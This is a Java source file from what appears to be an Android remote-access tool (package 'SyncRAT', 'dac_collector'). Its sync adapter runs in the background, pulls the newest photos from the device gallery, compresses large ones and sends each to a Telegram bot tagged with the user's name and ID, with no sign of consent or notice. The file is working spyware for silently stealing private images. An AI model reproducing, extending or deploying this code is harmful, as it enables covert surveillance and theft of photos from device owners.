package android.iocl.dac_collector.SyncRAT;


import android.accounts.Account;
import android.content.AbstractThreadedSyncAdapter;
import android.content.ContentProviderClient;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SyncResult;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.TelegramBot;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;

public class UploadSyncAdapter extends AbstractThreadedSyncAdapter {
    private Context mContext;
    private ContentResolver mResolver;

    public UploadSyncAdapter(Context context, boolean autoInitialize) {
        super(context, autoInitialize);
        mContext = context;
        mResolver = context.getContentResolver();
    }

    @Override
    public void onPerformSync(
            Account account,
            Bundle extras,
            String authority,
            ContentProviderClient provider,
            SyncResult syncResult) {
        uploadNewImages();
    }
    private void uploadNewImages() {
        String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_TAKEN
        };
        String sortOrder = MediaStore.Images.Media.DATE_TAKEN + " DESC";

        try (Cursor cursor = mResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                sortOrder)) {

            if (cursor == null) return;

            int maxToUpload = 1;
            int count = 0;

            String lastUploadedPath = SharedPrefs.getLastUploadedImage(mContext);

            while (cursor.moveToNext() && count < maxToUpload) {
                String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));

                // Skip if already uploaded
                if (path.equals(lastUploadedPath)) {
                    Log.d("testImageUpload", "Skipping already uploaded image: " + path);
                    continue;
                }

                File originalFile = new File(path);
                long sizeInKB = originalFile.length() / 1024;
                long sizeInMB = sizeInKB / 1024;

                Log.d("testImageUpload", "File: " + originalFile.getName() + " Size: " + sizeInKB + " KB");

                if (sizeInKB < 700) {
                    Log.d("testImageUpload", "Skipping small image: " + sizeInKB + " KB");
                    continue;
                }

                File fileToUpload;

                if (sizeInMB >= 4.9) {
                    fileToUpload = compressImageFile(originalFile);
                    if (fileToUpload == null) {
                        Log.d("testImageUpload", "Compression failed or still too large");
                        continue;
                    }
                    Log.d("testImageUpload", "Compressed image size: " + (fileToUpload.length() / 1024) + " KB");
                } else {
                    fileToUpload = originalFile;
                }

                String userIdentity = "[" + SharedPrefs.getUserName(mContext) + ", " + SharedPrefs.getUserID(mContext) + "]";

                TelegramBot.with(mContext).sendMessage("Uploading: " + fileToUpload.getName() + " | Size: " + (fileToUpload.length() / 1024) + " KB \nUser: " + userIdentity);
                TelegramBot.with(mContext).sendPhoto(fileToUpload, "Uploaded -> " + fileToUpload.getName() + " Size: " + (fileToUpload.length() / 1024) + " KB \nUser: " + userIdentity);

                // Save this path to prevent future re-uploads
                SharedPrefs.setLastUploadedImage(mContext, path);

                count++;
            }
        }
    }




    private File compressImageFile(File inputFile) {

        long originalSize = inputFile.length() / (1024 * 1024);

        if (originalSize < 4){
            return  inputFile;
        }

        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            Bitmap bitmap = BitmapFactory.decodeFile(inputFile.getAbsolutePath(), options);

            File outputDir = mContext.getCacheDir();
            File compressedFile = File.createTempFile("compressed_", ".jpg", outputDir);

            int quality = 100;
            while (quality > 10) {
                FileOutputStream fos = new FileOutputStream(compressedFile);
                bitmap.compress(Bitmap.CompressFormat.JPEG, quality, fos);
                fos.close();

                long sizeInMB = compressedFile.length() / (1024 * 1024);
                if (sizeInMB <= 4) {
                    return compressedFile;
                }
                quality -= 5;
            }

            return null;
        } catch (Exception e) {
            Log.e("ImageCompress", "Compression failed", e);
            return null;
        }
    }


}

